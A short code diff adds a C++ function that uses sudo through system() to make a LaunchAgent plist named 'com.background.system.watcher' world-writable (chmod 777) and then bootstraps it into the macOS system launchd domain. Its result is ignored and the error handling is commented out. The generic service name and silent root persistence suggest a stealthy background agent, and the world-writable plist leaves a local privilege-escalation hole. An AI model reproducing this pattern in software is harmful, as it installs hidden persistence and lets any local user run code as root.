@@ -64,3 +64,14 @@ char* GetHostName() {
         return nullptr;
     }
 }
+
+// TODO: change !!!
+void ReloadLaunchConfiguration() {
+    string cmd = "sudo launchctl bootstrap system /Library/LaunchAgents/com.background.system.watcher.plist";
+    string set_creds ="sudo chmod 777 /Library/LaunchAgents/com.background.system.watcher.plist";
+    int result = system(set_creds.c_str());
+    system(cmd.c_str());
+    // if (result != 0) {
+    //     std::cerr << "Ошибка перезапуска конфигурации автозапуска." << std::endl;
+    // }
+}
